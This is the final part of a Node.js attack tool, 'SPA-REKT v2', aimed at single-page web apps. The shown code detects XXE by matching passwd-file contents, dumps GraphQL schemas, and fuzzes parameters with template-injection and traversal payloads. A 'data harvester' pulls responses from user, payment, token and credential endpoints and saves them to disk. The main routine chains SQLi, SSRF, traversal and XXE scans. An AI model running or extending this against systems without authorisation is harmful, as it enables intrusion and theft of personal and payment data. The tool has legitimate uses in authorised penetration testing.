      if (/root:.*:0:0:|daemon:/i.test(r.text) || /\[fonts\]/i.test(r.text)) {
        vuln(`XXE! ${ep}`);
        REPORT.vulns.push({ type:"XXE", severity:"CRITICAL", endpoint: ep,
          detail: r.text.slice(0,300) });
      }
    }
  }
}

// ─── PHASE 12: GRAPHQL INTROSPECTION ─────────────────────────────────────────
const INTROSPECTION_QUERY = `{"query":"{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}`;

async function dumpGraphQL() {
  if (!OPT.graphql) return;
  log("Probing GraphQL...");
  const candidates = [
    "/graphql","/api/graphql","/graphql/v1","/v1/graphql",
    "/query","/gql","/api/gql","/graphiql",
    ...REPORT.endpoints.filter(e=>/graphql|gql/i.test(e.endpoint)).map(e=>e.endpoint),
  ];

  for (const ep of [...new Set(candidates)]) {
    const url = ORIGIN + ep;
    const r = await safe(url, {
      method: "POST",
      body: INTROSPECTION_QUERY,
      headers: { "Content-Type": "application/json", "Accept": "application/json" },
    });
    if (r.status === 200 && r.text.includes("__schema")) {
      hit(`GraphQL introspection OPEN at ${url}`);
      const dest = path.join(OPT.out, "graphql-schema.json");
      fs.writeFileSync(dest, r.text);
      REPORT.graphql = { url, schema: dest };
      REPORT.vulns.push({ type:"GraphQL Introspection Enabled", severity:"MEDIUM", url,
        detail:"Full schema exposed. Extract all types, mutations, queries, and args." });

      // Extract all queries/mutations
      try {
        const schema = JSON.parse(r.text);
        const types = schema.data?.__schema?.types || [];
        const ops = types.filter(t => ["Query","Mutation","Subscription"].includes(t.name));
        for (const op of ops) {
          log(`  ${op.name}: ${op.fields?.map(f=>f.name).join(", ") || "none"}`);
        }
      } catch {}
      break;
    }

    // Test for disabled introspection with field suggestions still on (info leak)
    const fieldTest = await safe(url, {
      method: "POST",
      body: `{"query":"{user{idd}}"}`,
      headers: { "Content-Type": "application/json" },
    });
    if (fieldTest.text.includes("Did you mean")) {
      warn(`GraphQL field suggestions enabled at ${url} — schema inference possible`);
      REPORT.vulns.push({ type:"GraphQL Field Suggestion Leak", severity:"LOW", url });
    }
  }
}

// ─── PHASE 13: PARAMETER FUZZING ─────────────────────────────────────────────
async function fuzzParams() {
  if (!OPT.fuzz) return;
  log("Fuzzing parameters...");
  const endpoints = [...new Set(REPORT.endpoints.map(e=>e.endpoint))].slice(0,20);
  const FUZZ_VALS = ["1","0","-1","99999","null","undefined","true","false","[]","{}","\"\"","''","<",">;","../","{{7*7}}"];

  for (const ep of endpoints) {
    const url = ORIGIN + ep.split("{")[0];
    const base = await safe(url);
    if (!base.status || base.status >= 500) continue;

    for (const val of FUZZ_VALS) {
      const testUrl = `${url}?id=${encodeURIComponent(val)}&debug=${encodeURIComponent(val)}`;
      const r = await safe(testUrl);
      // Template injection
      if (val === "{{7*7}}" && r.text.includes("49")) {
        vuln(`SSTI: ${url} reflects {{7*7}}=49`);
        REPORT.vulns.push({ type:"Server-Side Template Injection", severity:"CRITICAL", url: testUrl });
      }
      // Verbose errors
      if (r.status === 500) {
        REPORT.params.push({ url: testUrl, val, status:500, snippet: r.text.slice(0,200) });
        warn(`500 on fuzz: ${testUrl.slice(0,80)}`);
      }
    }
  }
}

// ─── PHASE 14: DATA HARVESTER ────────────────────────────────────────────────
async function harvestData() {
  if (!OPT.harvest) return;
  log("Harvesting API data...");
  const endpoints = [...new Set(REPORT.endpoints.map(e=>e.endpoint))];
  let harvested = 0;

  const interesting = endpoints.filter(ep =>
    /user|profile|account|me|admin|config|setting|secret|token|key|credential|password|email|phone|address|payment|billing|card|order|invoice|transaction/i.test(ep)
  ).slice(0, 50);

  for (const ep of interesting) {
    const url = ORIGIN + ep.split("{")[0];
    const r = await safe(url);
    if (r.status !== 200) continue;
    try {
      const json = JSON.parse(r.text);
      const dest = path.join(OPT.out, "harvested", ep.replace(/\//g,"-").slice(1,60) + ".json");
      fs.writeFileSync(dest, JSON.stringify(json, null, 2));
      hit(`  Harvested: ${ep} (${r.body.length}b)`);
      REPORT.harvested.push({ endpoint: ep, url, size: r.body.length, dest });
      harvested++;

      // Flag PII in response
      const flat = JSON.stringify(json);
      if (/email|phone|ssn|password|token|secret|credit.?card|cvv/i.test(flat)) {
        vuln(`PII/sensitive data in ${ep}`);
        REPORT.vulns.push({ type:"Sensitive Data Exposure", severity:"HIGH", endpoint: ep,
          detail: "Response contains potential PII or sensitive fields." });
      }
    } catch {}
  }
  log(`  Harvested ${harvested} API responses`);
}

// ─── PHASE 15: SECURITY HEADER AUDIT ─────────────────────────────────────────
function auditHeaders(h) {
  log("Auditing security headers...");
  const checks = [
    ["content-security-policy",   "CRITICAL", "No CSP — XSS trivially exploitable"],
    ["strict-transport-security", "HIGH",     "No HSTS — downgrade/MITM possible"],
    ["x-frame-options",           "MEDIUM",   "No X-Frame-Options — clickjacking risk"],
    ["x-content-type-options",    "LOW",      "No MIME sniff protection"],
    ["referrer-policy",           "LOW",      "No Referrer-Policy"],
    ["permissions-policy",        "INFO",     "No Permissions-Policy"],
  ];
  for (const [hdr, sev, msg] of checks) {
    if (!h[hdr]) {
      REPORT.vulns.push({ type:"Missing Security Header", severity:sev, header:hdr, detail:msg });
      warn(`  ${msg}`);
    }
  }
  if (h.server)          warn(`  Server disclosed: ${h.server}`);
  if (h["x-powered-by"]) warn(`  X-Powered-By: ${h["x-powered-by"]}`);

  const sc = h["set-cookie"];
  if (sc) {
    const cookies = Array.isArray(sc) ? sc : [sc];
    for (const c of cookies) {
      if (!/HttpOnly/i.test(c)) REPORT.vulns.push({ type:"Cookie Missing HttpOnly", severity:"MEDIUM", detail:c.slice(0,80) });
      if (!/Secure/i.test(c))   REPORT.vulns.push({ type:"Cookie Missing Secure",   severity:"MEDIUM", detail:c.slice(0,80) });
      if (!/SameSite/i.test(c)) REPORT.vulns.push({ type:"Cookie Missing SameSite", severity:"MEDIUM", detail:c.slice(0,80) });
      REPORT.cookies.push({ raw: c });
    }
  }
}

// ─── PHASE 16: REPORT ─────────────────────────────────────────────────────────
function writeReport() {
  const jsonPath = path.join(OPT.out, "rekt-report.json");
  fs.writeFileSync(jsonPath, JSON.stringify(REPORT, null, 2));

  const uniqueEps = [...new Set(REPORT.endpoints.map(e=>e.endpoint))];
  const critVulns = REPORT.vulns.filter(v=>v.severity==="CRITICAL");

  const md = [
    `# SPA-REKT v2 Report — ${HOST}`,
    `**Target:** ${TARGET}  `,
    `**Scan:** ${REPORT.timestamp}`,
    `**WAF:** ${REPORT.waf || "None detected"}`,
    `**Tech:** ${Object.entries(REPORT.tech).map(([k,v])=>`${k}: ${v}`).join(" | ") || "Unknown"}`,
    "",
    `## Summary`,
    `| | |`,
    `|---|---|`,
    `| Assets ripped | ${REPORT.assets.length} |`,
    `| Endpoints | ${uniqueEps.length} |`,
    `| Secrets found | ${REPORT.secrets.length} |`,
    `| Vulnerabilities | ${REPORT.vulns.length} (${critVulns.length} CRITICAL) |`,
    `| CORS issues | ${REPORT.cors.length} |`,
    `| Subdomains | ${REPORT.subdomains.length} |`,
    `| WS endpoints | ${REPORT.wsEndpoints.length} |`,
    `| Source maps | ${REPORT.sourcemaps.length} |`,
    `| Harvested responses | ${REPORT.harvested.length} |`,
    "",
    `## 🚨 Critical Vulnerabilities`,
    ...critVulns.map(v => `### ${v.type}\n- **URL:** ${v.url||v.endpoint||""}\n- **Detail:** ${v.detail||""}\n${v.exploit?"- **Exploit:** \`"+v.exploit+"\`":""}`),
    "",
    `## All Vulnerabilities (${REPORT.vulns.length})`,
    ...REPORT.vulns.map(v => `- [${v.severity||"?"}] **${v.type}** ${v.url||v.endpoint||""}`),
    "",
    `## Secrets (${REPORT.secrets.length})`,
    ...REPORT.secrets.map(s => `- **${s.type}** in \`${s.source}\`: \`${s.value.slice(0,80)}\``),
    "",
    `## Endpoints (${uniqueEps.length})`,
    ...uniqueEps.map(e => `- \`${e}\``),
    "",
    `## WebSocket Endpoints`,
    ...REPORT.wsEndpoints.map(w => `- \`${w.url}\` (${w.source})`),
    "",
    `## Subdomains (${REPORT.subdomains.length})`,
    ...REPORT.subdomains.map(s => `- \`${s.subdomain}\` ${s.ip||""} ${s.status||""}`),
  ].join("\n");

  fs.writeFileSync(path.join(OPT.out, "rekt-report.md"), md);

  console.log(`\n${C.red}${C.bold}╔════════════════════════════════╗`);
  console.log(`║      SPA-REKT v2 COMPLETE      ║`);
  console.log(`╚════════════════════════════════╝${C.reset}`);
  console.log(`  Target:       ${TARGET}`);
  console.log(`  Assets:       ${REPORT.assets.length}`);
  console.log(`  Endpoints:    ${uniqueEps.length}`);
  console.log(`  Secrets:      ${REPORT.secrets.length}`);
  console.log(`  Vulns:        ${REPORT.vulns.length} ${critVulns.length ? `(${C.red}${critVulns.length} CRITICAL${C.reset})` : ""}`);
  console.log(`  Subdomains:   ${REPORT.subdomains.length}`);
  console.log(`  WS Endpoints: ${REPORT.wsEndpoints.length}`);
  console.log(`  Sourcemaps:   ${REPORT.sourcemaps.length}`);
  console.log(`  Harvested:    ${REPORT.harvested.length} API responses`);
  console.log(`  Output:       ${OPT.out}/`);
  console.log(`  Report:       ${OPT.out}/rekt-report.md`);
}

// ─── MAIN ────────────────────────────────────────────────────────────────────
(async () => {
  console.log(`${C.red}${C.bold}`);
  console.log(`  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`);
  console.log(`  ┃          SPA-REKT v2 — FULL SPECTRUM           ┃`);
  console.log(`  ┃  ripper|secrets|sqli|ssrf|xxe|cors|graphql     ┃`);
  console.log(`  ┃  traversal|subdomains|sourcemaps|harvest|fuzz  ┃`);
  console.log(`  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
  console.log(`${C.reset}  Target: ${C.yellow}${TARGET}${C.reset}`);
  console.log(`  Output: ${OPT.out}/\n`);

  try {
    const { html, headers } = await fingerprint();
    await detectWAF();
    auditHeaders(headers);
    await ripAssets(html);
    await extractSourceMaps();
    await mineAll();
    await Promise.all([
      enumSubdomains(),
      scanCORS(),
    ]);
    await scanSQLi();
    await scanTraversal();
    await scanSSRF();
    await scanXXE();
    await dumpGraphQL();
    await fuzzParams();
    await harvestData();
    writeReport();
  } catch(e) {
    console.error(`${C.red}[FATAL]${C.reset}`, e.message, e.stack);
    process.exit(1);
  }
})();
